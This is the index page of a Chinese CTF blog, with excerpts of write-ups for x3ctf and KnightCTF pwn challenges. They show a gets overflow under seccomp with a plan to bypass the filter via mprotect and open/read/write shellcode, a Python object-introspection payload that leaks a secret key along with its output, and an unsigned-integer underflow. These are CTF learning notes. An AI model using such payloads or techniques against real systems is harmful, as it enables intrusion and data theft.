		<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="devnull-as-a-service"><a href="#devnull-as-a-service" class="headerlink" title="devnull-as-a-service"></a>devnull-as-a-service</h2><p>description</p>
<p>A few months ago, I came across <a target="_blank" rel="noopener" href="https://devnull-as-a-service.com/">this</a> website. Inspired by it, I decided to recreate the service in C to self-host it.<br> To avoid any exploitable vulnerabilities, I decided to use a very strict seccomp filter. Even if my code were vulnerable, good luck exploiting  it.<br> PS: You can find the flag at <code>/home/ctf/flag.txt</code> on the remote server.</p>
<p>程序逻辑很简单，gets栈溢出，静态链接没有pie但是开启了seccomp</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">dev_null</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
__int64 <span class="token function">dev_null</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[/dev/null as a service] Send us anything, we won't do anything with it."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">enable_seccomp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>seccomp规则，可以使用openat代替open然后read wrtie将flag读出来</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> line  CODE  JT   JF      K
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch
 0001: 0x15 0x00 0x1c 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0030
 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005
 0004: 0x15 0x00 0x19 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0030
 0005: 0x15 0x18 0x00 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0030
 0006: 0x15 0x17 0x00 0x00000003  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> close<span class="token punctuation">)</span> goto 0030
 0007: 0x15 0x16 0x00 0x00000012  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> pwrite64<span class="token punctuation">)</span> goto 0030
 0008: 0x15 0x15 0x00 0x00000014  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> writev<span class="token punctuation">)</span> goto 0030
 0009: 0x15 0x14 0x00 0x00000016  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> pipe<span class="token punctuation">)</span> goto 0030
 0010: 0x15 0x13 0x00 0x00000020  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> dup<span class="token punctuation">)</span> goto 0030
 0011: 0x15 0x12 0x00 0x00000021  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> dup2<span class="token punctuation">)</span> goto 0030
 0012: 0x15 0x11 0x00 0x00000028  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> sendfile<span class="token punctuation">)</span> goto 0030
 0013: 0x15 0x10 0x00 0x00000029  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> socket<span class="token punctuation">)</span> goto 0030
 0014: 0x15 0x0f 0x00 0x0000002c  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> sendto<span class="token punctuation">)</span> goto 0030
 0015: 0x15 0x0e 0x00 0x0000002e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> sendmsg<span class="token punctuation">)</span> goto 0030
 0016: 0x15 0x0d 0x00 0x00000031  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token builtin class-name">bind</span><span class="token punctuation">)</span> goto 0030
 0017: 0x15 0x0c 0x00 0x00000038  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> clone<span class="token punctuation">)</span> goto 0030
 0018: 0x15 0x0b 0x00 0x00000039  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> fork<span class="token punctuation">)</span> goto 0030
 0019: 0x15 0x0a 0x00 0x0000003a  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> vfork<span class="token punctuation">)</span> goto 0030
 0020: 0x15 0x09 0x00 0x0000003b  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execve<span class="token punctuation">)</span> goto 0030
 0021: 0x15 0x08 0x00 0x00000065  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> ptrace<span class="token punctuation">)</span> goto 0030
 0022: 0x15 0x07 0x00 0x00000113  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> splice<span class="token punctuation">)</span> goto 0030
 0023: 0x15 0x06 0x00 0x00000114  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">tee</span><span class="token punctuation">)</span> goto 0030
 0024: 0x15 0x05 0x00 0x00000124  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> dup3<span class="token punctuation">)</span> goto 0030
 0025: 0x15 0x04 0x00 0x00000125  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> pipe2<span class="token punctuation">)</span> goto 0030
 0026: 0x15 0x03 0x00 0x00000128  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> pwritev<span class="token punctuation">)</span> goto 0030
 0027: 0x15 0x02 0x00 0x00000137  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> process_vm_writev<span class="token punctuation">)</span> goto 0030
 0028: 0x15 0x01 0x00 0x00000142  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execveat<span class="token punctuation">)</span> goto 0030
 0029: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW
 0030: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是程序中找不到syscall ;ret 这类gadget，需要连续三次系统调用，想了一下直接用mprotect将bss的权限改成r | w | x的，往里面写orw_assemble直接跳过去就好了</p>
<p>exp</p>
	
	</div>
  <a type="button" href="/2025/01/27/x3ctf/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/01/27/KnightCTF/" >KnightCTF</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-01-27  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>嘛，因为学校那边的事情，好久没有打ctf了，找个beginner难度的ctf热身一下</p>
<h2 id="Knight’s-Secret"><a href="#Knight’s-Secret" class="headerlink" title="Knight’s Secret"></a>Knight’s Secret</h2><p>pyjail?? 题目自定义了一个person类，可以访问person类的属性，方法。题目目标只需要获取程序环境中的key，通过内置方法 mro返回的继承链数组来获取object对象，拿到object对象后就可以通过globals内置方法去检索程序中有的属性 方法拿到key</p>
<p>exp</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Enter your secret: <span class="token punctuation">&#123;</span>person_obj.__class__.__mro__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">&#125;</span>
Output: <span class="token punctuation">&#123;</span><span class="token string">'__name__'</span><span class="token builtin class-name">:</span> <span class="token string">'__main__'</span>, <span class="token string">'__doc__'</span><span class="token builtin class-name">:</span> None, <span class="token string">'__package__'</span><span class="token builtin class-name">:</span> None, <span class="token string">'__loader__'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>_frozen_importlib_external.SourceFileLoader object at 0x76a7e6a7b92<span class="token operator"><span class="token file-descriptor important">0</span>></span>, <span class="token string">'__spec__'</span><span class="token builtin class-name">:</span> None, <span class="token string">'__annotations__'</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>, <span class="token string">'__builtins__'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>module <span class="token string">'builtins'</span> <span class="token punctuation">(</span>built-in<span class="token punctuation">)</span><span class="token operator">></span>, <span class="token string">'__file__'</span><span class="token builtin class-name">:</span> <span class="token string">'/challenge/challenge.py'</span>, <span class="token string">'__cached__'</span><span class="token builtin class-name">:</span> None, <span class="token string">'CONFIG'</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token string">'KEY'</span><span class="token builtin class-name">:</span> <span class="token string">'_KNIGHTSECRET2025_'</span><span class="token punctuation">&#125;</span>, <span class="token string">'Person'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>class <span class="token string">'__main__.Person'</span><span class="token operator">></span>, <span class="token string">'fun'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>function fun at 0x76a7e6a6234<span class="token operator"><span class="token file-descriptor important">0</span>></span>, <span class="token string">'main'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>function main at 0x76a7e6840d6<span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="Knight-Bank"><a href="#Knight-Bank" class="headerlink" title="Knight Bank"></a>Knight Bank</h2><p>整数溢出，让uint溢出就好了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>

  v5 <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the Knight Bank!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your current balance is: %u\n"</span><span class="token punctuation">,</span> <span class="token number">1000LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the amount you want to withdraw: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;=</span> <span class="token number">0xF4240</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v5 <span class="token operator">-=</span> v4<span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You withdrew %u. Your new balance is %u.\n"</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0xF4240</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Better luck next time!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">win_prize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: You cannot withdraw more than 1,000,000 at a time."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid input. Exiting."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">win_prize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulations! You win the prize!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
	
	</div>
  <a type="button" href="/2025/01/27/KnightCTF/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/ctf/">ctf<span>57</span></a></li>
		
			<li><a href="/categories/gdb/">gdb<span>1</span></a></li>
		
			<li><a href="/categories/misc/">misc<span>1</span></a></li>
		
			<li><a href="/categories/ysyx/">ysyx<span>3</span></a></li>
		
			<li><a href="/categories/开源操作系统训练营2025/">开源操作系统训练营2025<span>1</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/heap/">heap<span>13</span></a></li>
		
			<li><a href="/tags/gdb/">gdb<span>2</span></a></li>
		
			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
		
			<li><a href="/tags/tls/">tls<span>1</span></a></li>
		
			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
		
			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
		
			<li><a href="/tags/iot/">iot<span>1</span></a></li>
		
			<li><a href="/tags/开源操作系统训练营2025/">开源操作系统训练营2025<span>1</span></a></li>
		
			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
		
			<li><a href="/tags/misc/">misc<span>1</span></a></li>
		
			<li><a href="/tags/rust/">rust<span>1</span></a></li>
		
			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
		
			<li><a href="/tags/riscv-pwn/">riscv pwn<span>1</span></a></li>
		
			<li><a href="/tags/seccomp/">seccomp<span>3</span></a></li>
		
			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
		
			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
		
			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
		
			<li><a href="/tags/ptmalloc2/">ptmalloc2<span>8</span></a></li>
		
			<li><a href="/tags/go-pwn/">go pwn<span>1</span></a></li>
		
			<li><a href="/tags/cpp-pwn/">cpp pwn<span>3</span></a></li>
		
		
		   <li><a href="/tags">...<span>26</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2025/10/05/图灵完备1/" ><i class="fa fa-file-o"></i>图灵完备1</a>
      </li>
    
      <li>
        <a href="/2025/10/04/ysyx-f4计算机系统的状态机模型/" ><i class="fa fa-file-o"></i>ysyx_f4计算机系统的状态机模型</a>
      </li>
    
      <li>
        <a href="/2025/10/03/ysyx-f3数电基础/" ><i class="fa fa-file-o"></i>ysyx_f3数电基础</a>
      </li>
    
      <li>
        <a href="/2025/09/15/rust1/" ><i class="fa fa-file-o"></i>rust语法基础1</a>
      </li>
    
      <li>
        <a href="/2025/08/25/nssctf4th_pwn/" ><i class="fa fa-file-o"></i>nssctf4th_pwn</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="false"></i><a href="https://blog.yuro.work/" title="" target="_blank"]);">yuro</a></li>
	
		<li><i class="false"></i><a href="https://shinichicun.top/" title="" target="_blank"]);">shin</a></li>
	
		<li><i class="false"></i><a href="https://k0rian.github.io/" title="" target="_blank"]);">k0rain</a></li>
	
		<li><i class="false"></i><a href="https://tokameine.top/" title="" target="_blank"]);">TokameinE</a></li>
	
		<li><i class="false"></i><a href="https://blog.xinshi.fun/" title="" target="_blank"]);">LilRan</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
